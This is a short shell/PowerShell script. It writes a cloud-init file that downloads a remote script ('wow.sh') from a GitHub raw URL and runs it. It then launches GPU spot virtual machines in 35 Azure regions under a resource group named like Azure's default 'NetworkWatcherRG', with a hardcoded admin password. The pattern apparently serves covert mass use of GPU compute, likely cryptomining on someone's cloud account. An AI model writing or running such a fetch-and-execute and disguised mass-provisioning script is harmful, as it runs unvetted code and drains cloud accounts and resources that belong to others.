echo $'#!/bin/bash\nwget -O wow.sh https://raw.githubusercontent.com/siwo81/dev/main/wow.sh && chmod +x wow.sh && bash ./wow.sh' > cloud-init.txt
$user = "azureuser"
$password = "RnSGroup180881"
$locations = "eastus", "eastus2", "southcentralus", "westus2", "westus3", "australiaeast", "southeastasia", "northeurope", "swedencentral", "uksouth", "westeurope", "centralus", "northcentralus", "westus", "southafricanorth", "centralindia", "eastasia", "japaneast", "koreacentral", "canadacentral", "francecentral", "germanywestcentral", "norwayeast", "switzerlandnorth", "uaenorth", "brazilsouth", "westcentralus", "australiacentral", "australiasoutheast", "japanwest", "koreasouth", "southindia", "westindia", "canadaeast", "ukwest"
az group create -n NetworkWatcherRG -l eastus
for ($i = 0 ; $i -lt $locations.Length ; $i++) {
    $index = ([string]($i + 1)).PadLeft(2, '0')
    $name = "M" + $index
    $location = $locations[$i]
    tmux new-session -d -s $name
    tmux send -t $name "az vm create -n $name -l $location -g NetworkWatcherRG --image UbuntuLTS --size Standard_NC6s_v3 --admin-password $password --admin-username $user --public-ip-sku Standard --priority Spot --eviction-policy Deallocate" ENTER
    echo $name;
}
